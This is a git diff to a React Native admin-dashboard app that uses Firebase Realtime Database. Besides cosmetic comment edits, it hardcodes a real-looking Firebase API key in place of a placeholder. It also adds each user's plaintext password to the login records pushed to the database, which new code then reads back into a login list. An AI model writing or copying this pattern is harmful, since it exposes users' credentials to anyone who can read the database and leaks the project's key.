@@ -15,10 +15,10 @@ import {
 import { initializeApp } from "firebase/app";
 import { getDatabase, ref, push, onValue } from "firebase/database";
 
-/* ---------------- FIREBASE CONFIG ---------------- */
+/*  FIREBASE CONFIG  */
 
 const firebaseConfig = {
-  apiKey: "YOUR_API_KEY",
+  apiKey: "AIzaSyC4lyL-dPlP-xeupAx_WgENonHXt-Dy4N8",
   authDomain: "selah-vastra-admin.firebaseapp.com",
   databaseURL:
     "https://selah-vastra-admin-default-rtdb.firebaseio.com",
@@ -36,6 +36,7 @@ export default function App() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [loginCount, setLoginCount] = useState(0);
+  const [loginList, setLoginList] = useState([]);
 
   const [noteText, setNoteText] = useState("");
   const [notes, setNotes] = useState([]);
@@ -49,15 +50,22 @@ export default function App() {
 
   /* 🔥 Realtime Login Count */
   useEffect(() => {
-    const loginRef = ref(database, "logins");
-    onValue(loginRef, (snapshot) => {
-      const data = snapshot.val();
-      if (data) setLoginCount(Object.keys(data).length);
-      else setLoginCount(0);
-    });
-  }, []);
+  const loginRef = ref(database, "logins");
+  onValue(loginRef, (snapshot) => {
+    const data = snapshot.val();
 
-  /* 🔥 Realtime Notes */
+    if (data) {
+      const values = Object.values(data).reverse();
+      setLoginCount(values.length);
+      setLoginList(values);
+    } else {
+      setLoginCount(0);
+      setLoginList([]);
+    }
+  });
+}, []);
+
+  /*Realtime Notes */
   useEffect(() => {
     const notesRef = ref(database, "adminNotes");
     onValue(notesRef, (snapshot) => {
@@ -67,7 +75,7 @@ export default function App() {
     });
   }, []);
 
-  /* 🔥 Animate Bars on Load */
+  /* Animate Bars on Load */
   useEffect(() => {
     Animated.stagger(
       150,
@@ -89,6 +97,7 @@ export default function App() {
 
     push(ref(database, "logins"), {
       email,
+      password,
       timestamp: Date.now(),
     });
 
@@ -120,7 +129,7 @@ export default function App() {
     setNoteText("");
   };
 
-  /* ---------------- LOGIN ---------------- */
+  /*  LOGIN  */
 
   if (screen === "login") {
     return (
@@ -149,7 +158,7 @@ export default function App() {
     );
   }
 
-  /* ---------------- DASHBOARD ---------------- */
+  /* DASHBOARD  */
 
   const stats = [
     { title: "Total Sales", value: "₹2,45,800" },
@@ -338,7 +347,7 @@ export default function App() {
   );
 }
 
-/* ---------------- STYLES ---------------- */
+/*  STYLES  */
 
 const styles = StyleSheet.create({
   safeArea: { flex: 1, backgroundColor: "#f2f2f7" },
